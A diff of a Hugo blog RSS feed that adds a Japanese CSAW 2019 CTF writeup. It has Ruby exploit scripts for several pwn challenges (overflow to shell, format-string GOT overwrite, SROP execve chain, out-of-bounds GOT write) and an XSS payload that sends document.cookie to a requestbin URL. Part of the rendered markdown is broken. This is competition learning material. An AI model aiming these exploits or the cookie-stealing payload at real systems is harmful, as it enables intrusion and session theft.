@@ -80,8 +80,222 @@
     <description>Recent content in Posts on $ make life</description>
     <generator>Hugo -- gohugo.io</generator>
     <language>en-us</language>
-    <lastBuildDate>Sun, 19 May 2019 16:54:53 +0900</lastBuildDate>
+    <lastBuildDate>Mon, 16 Sep 2019 09:50:28 +0900</lastBuildDate>
     <atom:link href="https://owlinux1000.github.io/blog/post/index.xml" rel="self" type="application/rss+xml" />
+    <item>
+      <title>Csaw2019 writeup</title>
+      <link>https://owlinux1000.github.io/blog/post/csaw2019/</link>
+      <pubDate>Mon, 16 Sep 2019 09:50:28 +0900</pubDate>
+      <guid>https://owlinux1000.github.io/blog/post/csaw2019/</guid>
+      <description>
+
+&lt;h2 id=&#34;misc&#34;&gt;Misc&lt;/h2&gt;
+
+&lt;h3 id=&#34;mcgriddlev2&#34;&gt;mcgriddlev2&lt;/h3&gt;
+
+&lt;ul&gt;
+&lt;li&gt;問題文にFLAGが記載されている&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;flag{W3lcome_7o_CSAW_QUALS_2019!}&lt;/strong&gt;&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;h2 id=&#34;pwn&#34;&gt;Pwn&lt;/h2&gt;
+
+&lt;h3 id=&#34;baby-boi-50pt&#34;&gt;baby_boi (50pt)&lt;/h3&gt;
+
+&lt;ul&gt;
+&lt;li&gt;シンプルなBOFでIPが奪える問題&lt;/li&gt;
+
+&lt;li&gt;&lt;p&gt;libcのアドレスを出力してくれているので、配布されたlibcでオフセット求めてOne-Gadget に飛ばしてシェルを奪う&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-ruby&#34; data-lang=&#34;ruby&#34;&gt;&lt;span style=&#34;color:#408080;font-style:italic&#34;&gt;#!/usr/bin/env ruby&lt;/span&gt;
+&lt;span style=&#34;color:#408080;font-style:italic&#34;&gt;# coding: ascii-8bit&lt;/span&gt;
+&lt;span style=&#34;color:#008000&#34;&gt;require&lt;/span&gt; &lt;span style=&#34;color:#ba2121&#34;&gt;&amp;#39;pwn&amp;#39;&lt;/span&gt;
+$z &lt;span style=&#34;color:#666&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#800&#34;&gt;Sock&lt;/span&gt;&lt;span style=&#34;color:#666&#34;&gt;.&lt;/span&gt;new &lt;span style=&#34;color:#ba2121&#34;&gt;&amp;#34;localhost&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#666&#34;&gt;8888&lt;/span&gt;
+$z &lt;span style=&#34;color:#666&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#800&#34;&gt;Sock&lt;/span&gt;&lt;span style=&#34;color:#666&#34;&gt;.&lt;/span&gt;new &lt;span style=&#34;color:#ba2121&#34;&gt;&amp;#34;pwn.chal.csaw.io&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#666&#34;&gt;1005&lt;/span&gt;
+libc &lt;span style=&#34;color:#666&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#800&#34;&gt;ELF&lt;/span&gt;&lt;span style=&#34;color:#666&#34;&gt;.&lt;/span&gt;new &lt;span style=&#34;color:#ba2121&#34;&gt;&amp;#34;./libc-2.27.so&amp;#34;&lt;/span&gt;
+&lt;span style=&#34;color:#408080;font-style:italic&#34;&gt;#libc = ELF.new &amp;#34;/lib/x86_64-linux-gnu/libc-2.29.so&amp;#34;&lt;/span&gt;
+&lt;span style=&#34;color:#008000;font-weight:bold&#34;&gt;def&lt;/span&gt; &lt;span style=&#34;color:#00f&#34;&gt;z&lt;/span&gt;; $z; &lt;span style=&#34;color:#008000;font-weight:bold&#34;&gt;end&lt;/span&gt;
+z&lt;span style=&#34;color:#666&#34;&gt;.&lt;/span&gt;recvuntil(&lt;span style=&#34;color:#ba2121&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#b62;font-weight:bold&#34;&gt;\n&lt;/span&gt;&lt;span style=&#34;color:#ba2121&#34;&gt;&amp;#34;&lt;/span&gt;)
+libc_printf &lt;span style=&#34;color:#666&#34;&gt;=&lt;/span&gt; z&lt;span style=&#34;color:#666&#34;&gt;.&lt;/span&gt;recvuntil(&lt;span style=&#34;color:#ba2121&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#b62;font-weight:bold&#34;&gt;\n&lt;/span&gt;&lt;span style=&#34;color:#ba2121&#34;&gt;&amp;#34;&lt;/span&gt;)&lt;span style=&#34;color:#666&#34;&gt;.&lt;/span&gt;match(&lt;span style=&#34;color:#b68&#34;&gt;/: (.+)/&lt;/span&gt;)&lt;span style=&#34;color:#666&#34;&gt;[&lt;/span&gt;&lt;span style=&#34;color:#666&#34;&gt;1&lt;/span&gt;&lt;span style=&#34;color:#666&#34;&gt;].&lt;/span&gt;to_i(&lt;span style=&#34;color:#666&#34;&gt;16&lt;/span&gt;)
+libc_base &lt;span style=&#34;color:#666&#34;&gt;=&lt;/span&gt; libc_printf &lt;span style=&#34;color:#666&#34;&gt;-&lt;/span&gt; libc&lt;span style=&#34;color:#666&#34;&gt;.&lt;/span&gt;symbols&lt;span style=&#34;color:#666&#34;&gt;[&lt;/span&gt;&lt;span style=&#34;color:#ba2121&#34;&gt;&amp;#34;printf&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#666&#34;&gt;]&lt;/span&gt;
+&lt;span style=&#34;color:#008000&#34;&gt;puts&lt;/span&gt; &lt;span style=&#34;color:#ba2121&#34;&gt;&amp;#34;%x&amp;#34;&lt;/span&gt; &lt;span style=&#34;color:#008000&#34;&gt;% libc_base
+&lt;/span&gt;&lt;span style=&#34;color:#008000&#34;&gt;payload &lt;/span&gt; &lt;span style=&#34;color:#666&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ba2121&#34;&gt;&amp;#34;A&amp;#34;&lt;/span&gt; &lt;span style=&#34;color:#666&#34;&gt;*&lt;/span&gt; &lt;span style=&#34;color:#666&#34;&gt;40&lt;/span&gt;
+payload &lt;span style=&#34;color:#666&#34;&gt;&amp;lt;&amp;lt;&lt;/span&gt; p64(libc_base &lt;span style=&#34;color:#666&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#666&#34;&gt;0x4f322&lt;/span&gt;)
+z&lt;span style=&#34;color:#666&#34;&gt;.&lt;/span&gt;sendline(payload)
+z&lt;span style=&#34;color:#666&#34;&gt;.&lt;/span&gt;interact&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/li&gt;
+
+&lt;li&gt;&lt;p&gt;&lt;strong&gt;flag{baby_boi_dodooo_doo_doo_dooo}&lt;/strong&gt;&lt;/p&gt;&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;h3 id=&#34;got-milk-50pt&#34;&gt;GOT Milk? (50pt)&lt;/h3&gt;
+
+&lt;ul&gt;
+&lt;li&gt;独自の共有オブジェクトとバイナリが配られる&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;set LD_LIBRARY_PATH ./&lt;/code&gt; でカレントディレクトリの共有オブジェクトを見るようにする&lt;/li&gt;
+
+&lt;li&gt;&lt;p&gt;FSBがあるので、それを使ってGOT Overwriteする&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-ruby&#34; data-lang=&#34;ruby&#34;&gt;&lt;span style=&#34;color:#408080;font-style:italic&#34;&gt;#!/usr/bin/env ruby&lt;/span&gt;
+&lt;span style=&#34;color:#408080;font-style:italic&#34;&gt;# coding: ascii-8bit&lt;/span&gt;
+&lt;span style=&#34;color:#008000&#34;&gt;require&lt;/span&gt; &lt;span style=&#34;color:#ba2121&#34;&gt;&amp;#39;pwn&amp;#39;&lt;/span&gt;
+&lt;span style=&#34;color:#008000&#34;&gt;require&lt;/span&gt; &lt;span style=&#34;color:#ba2121&#34;&gt;&amp;#39;fsa&amp;#39;&lt;/span&gt;
+&lt;span style=&#34;color:#408080;font-style:italic&#34;&gt;#$z = Sock.new &amp;#34;localhost&amp;#34;, 8888&lt;/span&gt;
+$z &lt;span style=&#34;color:#666&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#800&#34;&gt;Sock&lt;/span&gt;&lt;span style=&#34;color:#666&#34;&gt;.&lt;/span&gt;new &lt;span style=&#34;color:#ba2121&#34;&gt;&amp;#34;pwn.chal.csaw.io&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#666&#34;&gt;1004&lt;/span&gt;
+&lt;span style=&#34;color:#008000;font-weight:bold&#34;&gt;def&lt;/span&gt; &lt;span style=&#34;color:#00f&#34;&gt;z&lt;/span&gt;; $z; &lt;span style=&#34;color:#008000;font-weight:bold&#34;&gt;end&lt;/span&gt;
+value &lt;span style=&#34;color:#666&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#666&#34;&gt;0x89&lt;/span&gt;
+fmt &lt;span style=&#34;color:#666&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#800&#34;&gt;FSA&lt;/span&gt;&lt;span style=&#34;color:#666&#34;&gt;.&lt;/span&gt;new()
+fmt&lt;span style=&#34;color:#666&#34;&gt;[&lt;/span&gt;&lt;span style=&#34;color:#666&#34;&gt;0x804a010&lt;/span&gt;&lt;span style=&#34;color:#666&#34;&gt;]&lt;/span&gt; &lt;span style=&#34;color:#666&#34;&gt;=&lt;/span&gt; value
+payload &lt;span style=&#34;color:#666&#34;&gt;=&lt;/span&gt; fmt&lt;span style=&#34;color:#666&#34;&gt;.&lt;/span&gt;payload(&lt;span style=&#34;color:#666&#34;&gt;7&lt;/span&gt;) &lt;span style=&#34;color:#408080;font-style:italic&#34;&gt;# index of argument&lt;/span&gt;
+&lt;span style=&#34;color:#008000&#34;&gt;puts&lt;/span&gt; z&lt;span style=&#34;color:#666&#34;&gt;.&lt;/span&gt;recvuntil(&lt;span style=&#34;color:#ba2121&#34;&gt;&amp;#34;? &amp;#34;&lt;/span&gt;)
+z&lt;span style=&#34;color:#666&#34;&gt;.&lt;/span&gt;sendline(payload)
+&lt;span style=&#34;color:#008000&#34;&gt;puts&lt;/span&gt; z&lt;span style=&#34;color:#666&#34;&gt;.&lt;/span&gt;recv&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/li&gt;
+
+&lt;li&gt;&lt;p&gt;&lt;strong&gt;flag{y0u_g00000t_mi1k_4_M3!?}&lt;/strong&gt;&lt;/p&gt;&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;h3 id=&#34;small-boi-100pt&#34;&gt;small_boi (100pt)&lt;/h3&gt;
+
+&lt;ul&gt;
+&lt;li&gt;statically linked でstrippedな小さなバイナリが与えられる&lt;/li&gt;
+
+&lt;li&gt;&lt;p&gt;sig_return システムコールを呼ぶようなraxの設定のされ方があるのと自明なBOFがあるので、Sigreturn ROP (SROP) で &lt;code&gt;execve(&amp;quot;/bin/sh&amp;quot;, 0, 0)&lt;/code&gt; を実行する&lt;/p&gt;
+
+&lt;ul&gt;
+&lt;li&gt;SROPは、スタックの値を使ってsig_return実行時にレジスタの値を代入する攻撃&lt;/li&gt;
+
+&lt;li&gt;&lt;p&gt;これを使ってrdiやrsi、ripなどが設定できるため任意のシステムコールを呼べる&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-ruby&#34; data-lang=&#34;ruby&#34;&gt;&lt;span style=&#34;color:#408080;font-style:italic&#34;&gt;#!/usr/bin/env ruby&lt;/span&gt;
+&lt;span style=&#34;color:#408080;font-style:italic&#34;&gt;# coding: ascii-8bit&lt;/span&gt;
+&lt;span style=&#34;color:#008000&#34;&gt;require&lt;/span&gt; &lt;span style=&#34;color:#ba2121&#34;&gt;&amp;#39;pwn&amp;#39;&lt;/span&gt;
+&lt;span style=&#34;color:#408080;font-style:italic&#34;&gt;#$z = Sock.new &amp;#34;localhost&amp;#34;, 8888&lt;/span&gt;
+$z &lt;span style=&#34;color:#666&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#800&#34;&gt;Sock&lt;/span&gt;&lt;span style=&#34;color:#666&#34;&gt;.&lt;/span&gt;new &lt;span style=&#34;color:#ba2121&#34;&gt;&amp;#34;pwn.chal.csaw.io&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#666&#34;&gt;1002&lt;/span&gt;
+&lt;span style=&#34;color:#008000;font-weight:bold&#34;&gt;def&lt;/span&gt; &lt;span style=&#34;color:#00f&#34;&gt;z&lt;/span&gt;; $z; &lt;span style=&#34;color:#008000;font-weight:bold&#34;&gt;end&lt;/span&gt;
+payload &lt;span style=&#34;color:#666&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ba2121&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#b62;font-weight:bold&#34;&gt;\x00&lt;/span&gt;&lt;span style=&#34;color:#ba2121&#34;&gt;&amp;#34;&lt;/span&gt; &lt;span style=&#34;color:#666&#34;&gt;*&lt;/span&gt; &lt;span style=&#34;color:#666&#34;&gt;0x28&lt;/span&gt;
+payload &lt;span style=&#34;color:#666&#34;&gt;&amp;lt;&amp;lt;&lt;/span&gt; p64(&lt;span style=&#34;color:#666&#34;&gt;0x40017c&lt;/span&gt;)
+payload &lt;span style=&#34;color:#666&#34;&gt;&amp;lt;&amp;lt;&lt;/span&gt; p64(&lt;span style=&#34;color:#666&#34;&gt;0x0&lt;/span&gt;) &lt;span style=&#34;color:#666&#34;&gt;*&lt;/span&gt; &lt;span style=&#34;color:#666&#34;&gt;4&lt;/span&gt;
+payload &lt;span style=&#34;color:#666&#34;&gt;&amp;lt;&amp;lt;&lt;/span&gt; p64(&lt;span style=&#34;color:#666&#34;&gt;0x0&lt;/span&gt;) &lt;span style=&#34;color:#666&#34;&gt;*&lt;/span&gt; &lt;span style=&#34;color:#666&#34;&gt;8&lt;/span&gt; &lt;span style=&#34;color:#408080;font-style:italic&#34;&gt;# r8~r15&lt;/span&gt;
+payload &lt;span style=&#34;color:#666&#34;&gt;&amp;lt;&amp;lt;&lt;/span&gt; p64(&lt;span style=&#34;color:#666&#34;&gt;0x4001ca&lt;/span&gt;) &lt;span style=&#34;color:#408080;font-style:italic&#34;&gt;# rdi = /bin/sh&lt;/span&gt;
+payload &lt;span style=&#34;color:#666&#34;&gt;&amp;lt;&amp;lt;&lt;/span&gt; p64(&lt;span style=&#34;color:#666&#34;&gt;0&lt;/span&gt;) &lt;span style=&#34;color:#408080;font-style:italic&#34;&gt;# rsi&lt;/span&gt;
+payload &lt;span style=&#34;color:#666&#34;&gt;&amp;lt;&amp;lt;&lt;/span&gt; p64(&lt;span style=&#34;color:#666&#34;&gt;0&lt;/span&gt;) &lt;span style=&#34;color:#408080;font-style:italic&#34;&gt;# rbp&lt;/span&gt;
+payload &lt;span style=&#34;color:#666&#34;&gt;&amp;lt;&amp;lt;&lt;/span&gt; p64(&lt;span style=&#34;color:#666&#34;&gt;0&lt;/span&gt;) &lt;span style=&#34;color:#408080;font-style:italic&#34;&gt;# &lt;/span&gt;
+payload &lt;span style=&#34;color:#666&#34;&gt;&amp;lt;&amp;lt;&lt;/span&gt; p64(&lt;span style=&#34;color:#666&#34;&gt;0&lt;/span&gt;) &lt;span style=&#34;color:#408080;font-style:italic&#34;&gt;# &lt;/span&gt;
+payload &lt;span style=&#34;color:#666&#34;&gt;&amp;lt;&amp;lt;&lt;/span&gt; p64(&lt;span style=&#34;color:#666&#34;&gt;0x3b&lt;/span&gt;) &lt;span style=&#34;color:#408080;font-style:italic&#34;&gt;# rax = 0x3b &lt;/span&gt;
+payload &lt;span style=&#34;color:#666&#34;&gt;&amp;lt;&amp;lt;&lt;/span&gt; p64(&lt;span style=&#34;color:#666&#34;&gt;0&lt;/span&gt;) &lt;span style=&#34;color:#408080;font-style:italic&#34;&gt;# rcx&lt;/span&gt;
+payload &lt;span style=&#34;color:#666&#34;&gt;&amp;lt;&amp;lt;&lt;/span&gt; p64(&lt;span style=&#34;color:#666&#34;&gt;0&lt;/span&gt;)   &lt;span style=&#34;color:#408080;font-style:italic&#34;&gt;# rsp&lt;/span&gt;
+payload &lt;span style=&#34;color:#666&#34;&gt;&amp;lt;&amp;lt;&lt;/span&gt; p64(&lt;span style=&#34;color:#666&#34;&gt;0x00400185&lt;/span&gt;) &lt;span style=&#34;color:#408080;font-style:italic&#34;&gt;# rip = syscall&lt;/span&gt;
+payload &lt;span style=&#34;color:#666&#34;&gt;&amp;lt;&amp;lt;&lt;/span&gt; p64(&lt;span style=&#34;color:#666&#34;&gt;0x0&lt;/span&gt;) &lt;span style=&#34;color:#408080;font-style:italic&#34;&gt;# eflags&lt;/span&gt;
+payload &lt;span style=&#34;color:#666&#34;&gt;&amp;lt;&amp;lt;&lt;/span&gt; p16(&lt;span style=&#34;color:#666&#34;&gt;0x33&lt;/span&gt;) &lt;span style=&#34;color:#408080;font-style:italic&#34;&gt;# cs&lt;/span&gt;
+payload &lt;span style=&#34;color:#666&#34;&gt;&amp;lt;&amp;lt;&lt;/span&gt; p16(&lt;span style=&#34;color:#666&#34;&gt;0&lt;/span&gt;)
+payload &lt;span style=&#34;color:#666&#34;&gt;&amp;lt;&amp;lt;&lt;/span&gt; p16(&lt;span style=&#34;color:#666&#34;&gt;0&lt;/span&gt;)
+payload &lt;span style=&#34;color:#666&#34;&gt;&amp;lt;&amp;lt;&lt;/span&gt; p16(&lt;span style=&#34;color:#666&#34;&gt;0x2b&lt;/span&gt;) &lt;span style=&#34;color:#408080;font-style:italic&#34;&gt;# ss&lt;/span&gt;
+payload &lt;span style=&#34;color:#666&#34;&gt;&amp;lt;&amp;lt;&lt;/span&gt; p64(&lt;span style=&#34;color:#666&#34;&gt;0x0&lt;/span&gt;) &lt;span style=&#34;color:#666&#34;&gt;*&lt;/span&gt; &lt;span style=&#34;color:#666&#34;&gt;5&lt;/span&gt; &lt;span style=&#34;color:#408080;font-style:italic&#34;&gt;# err ~ union&lt;/span&gt;
+payload &lt;span style=&#34;color:#666&#34;&gt;&amp;lt;&amp;lt;&lt;/span&gt; p64(&lt;span style=&#34;color:#666&#34;&gt;0x0&lt;/span&gt;) &lt;span style=&#34;color:#666&#34;&gt;*&lt;/span&gt; &lt;span style=&#34;color:#666&#34;&gt;8&lt;/span&gt; &lt;span style=&#34;color:#408080;font-style:italic&#34;&gt;# reserved[8]&lt;/span&gt;
+z&lt;span style=&#34;color:#666&#34;&gt;.&lt;/span&gt;sendline payload
+z&lt;span style=&#34;color:#666&#34;&gt;.&lt;/span&gt;interact&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/li&gt;
+&lt;/ul&gt;&lt;/li&gt;
+
+&lt;li&gt;&lt;p&gt;&lt;strong&gt;flag{sigrop_pop_pop_pop}&lt;/strong&gt;&lt;/p&gt;&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;h3 id=&#34;traveller&#34;&gt;traveller&lt;/h3&gt;
+
+&lt;ul&gt;
+&lt;li&gt;解けなかったのでwriteupを見た&lt;/li&gt;
+&lt;li&gt;Off-by-oneがあるためHeap問題かと思ったら操作対象のインデックスの入力に負数が入力できるOOB問題&lt;/li&gt;
+
+&lt;li&gt;&lt;p&gt;編集コマンドで、&lt;code&gt;-50&lt;/code&gt; をするとfree@gotを書き換えられたのでこれを使って&lt;code&gt;cat_flag&lt;/code&gt;関数に飛ばす
+```ruby
+#!/usr/bin/env ruby&lt;/p&gt;
+
+&lt;h1 id=&#34;coding-ascii-8bit&#34;&gt;coding: ascii-8bit&lt;/h1&gt;
+
+&lt;p&gt;require &amp;lsquo;pwn&amp;rsquo;&lt;/p&gt;&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;$z = Sock.new &amp;ldquo;pwn.chal.csaw.io&amp;rdquo;, 1003
+#elf = ELF.new &amp;ldquo;./traveller&amp;rdquo;
+#libc = ELF.new &amp;ldquo;./libc-2.23.so&amp;rdquo;&lt;/p&gt;
+
+&lt;p&gt;context.log_level = :debug
+def z; $z; end&lt;/p&gt;
+
+&lt;p&gt;def add(dist, dest)
+  z.sendline &amp;ldquo;1&amp;rdquo;
+  z.recvuntil &amp;ldquo;&amp;gt; &amp;ldquo;
+  z.sendline dist.to_s
+  z.recvuntil &amp;ldquo;: &amp;ldquo;
+  z.sendline dest
+  z.recvuntil &amp;ldquo;&amp;gt; &amp;ldquo;
+end&lt;/p&gt;
+
+&lt;p&gt;def change(dist, dest)
+  z.sendline &amp;ldquo;2&amp;rdquo;
+  z.recvuntil &amp;ldquo;: &amp;ldquo;
+  z.sendline dist.to_s
+  z.send dest
+  z.recvuntil &amp;ldquo;&amp;gt; &amp;ldquo;
+end&lt;/p&gt;
+
+&lt;p&gt;def delete(dist)
+  z.sendline &amp;ldquo;3&amp;rdquo;
+  z.recvuntil &amp;ldquo;: &amp;ldquo;
+  z.sendline dist.to_s
+  z.recvuntil &amp;ldquo;&amp;gt; &amp;ldquo;
+end&lt;/p&gt;
+
+&lt;p&gt;def check(dist)
+  z.sendline &amp;ldquo;4&amp;rdquo;
+  z.recvuntil &amp;ldquo;&amp;gt;&amp;rdquo;
+  z.sendline dist.to_s
+  return z.recvuntil &amp;ldquo;&amp;gt; &amp;ldquo;
+end&lt;/p&gt;
+
+&lt;p&gt;tmp = z.recvuntil &amp;ldquo;&amp;gt; &amp;ldquo;
+stack_address = tmp.match(/.\n(.*) \n\n/)[1].to_i(16)&lt;/p&gt;
+
+&lt;p&gt;add(1, &amp;ldquo;AAAAAAAA&amp;rdquo;)
+change(-50, p64(0x4008b6))
+puts delete(0)&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;- **flag{h0pe_y0u_3nj0y_ur_j0urn3y}**
+
+## Rev
+
+### Beleaf
+
+- バイナリ中にFLAGに使われる文字列とインデックスの配列があるので、それを引っこ抜いてきて実行する
+```ruby
+#!/usr/bin/env ruby
+
+idxs = [0x1, 0x9, 0x11, 0x27, 0x02, 0x00, 0x12, 0x03, 0x8, 0x12, 0x9, 0x12, 0x11, 0x1, 0x3, 0x13, 0x4, 0x3, 0x5, 0x15, 0x2e, 0xa, 0x3, 0xa, 0x12, 0x3, 0x1, 0x2e, 0x16, 0x2e, 0xa, 0x12, 0x6]
+
+flag = [0x77, 0x66, 0x7b, 0x5f, 0x6e, 0x79, 0x7d, 0x20, 0x62, 0x6c, 0x72, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x61, 0x65, 0x69, 0x20, 0x6f, 0x74, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x67, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x75].map(&amp;amp;:chr)
+
+idxs.each do |i|
+  print flag[i]
+end&lt;/pre&gt;&lt;/div&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;strong&gt;flag{we_beleaf_in_your_re_future}&lt;/strong&gt;&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;h2 id=&#34;web&#34;&gt;Web&lt;/h2&gt;
+
+&lt;h3 id=&#34;baby-csp&#34;&gt;baby csp&lt;/h3&gt;
+
+&lt;ul&gt;
+&lt;li&gt;CSPが有効なXSS問題
+
+&lt;ul&gt;
+&lt;li&gt;&lt;code&gt;default-src &#39;self&#39;; script-src &#39;self&#39; *.google.com; connect-src *&lt;/code&gt;&lt;/li&gt;
+&lt;/ul&gt;&lt;/li&gt;
+&lt;li&gt;上記のCSPからJSONPエンドポイントでのXSSを使う
+
+&lt;ul&gt;
+&lt;li&gt;&lt;a href=&#34;https://inside.pixiv.blog/kobo/5137&#34;&gt;https://inside.pixiv.blog/kobo/5137&lt;/a&gt;&lt;/li&gt;
+&lt;/ul&gt;&lt;/li&gt;
+&lt;li&gt;FLAGは、Cookieにあるので、requestbin を使ってPOSTさせるJavaScriptを埋め込む&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;&amp;lt;script src=&amp;quot;https://accounts.google.com/o/oauth2/revoke?callback=navigator.sendBeacon(&#39;http://requestbin.net/r/ugix54ug&#39;, document.cookie)&amp;quot;&amp;gt;&amp;lt;/script&amp;gt;&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;flag{csp_will_solve_EVERYTHING}&lt;/strong&gt;&lt;/li&gt;
+&lt;/ul&gt;
+</description>
+    </item>
     <item>
       <title>HarekazeCTF 2019 writeup</title>
       <link>https://owlinux1000.github.io/blog/post/harekazectf2019/</link>
